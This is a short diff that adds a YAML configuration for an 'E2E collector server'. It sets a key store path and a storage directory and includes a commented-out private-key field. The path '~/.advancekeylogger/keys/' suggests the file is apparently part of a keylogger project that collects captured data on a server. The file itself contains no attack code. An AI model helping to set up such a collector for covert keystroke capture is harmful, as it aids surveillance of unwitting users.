@@ -1,0 +1,8 @@
+# E2E collector server configuration
+
+e2e_server:
+  key_store_path: "~/.advancekeylogger/keys/"
+  storage_dir: "./server_data"
+  # Optional: provide private key directly (base64). If omitted, server will
+  # load server_x25519_private from key_store_path.
+  # server_private_key: ""
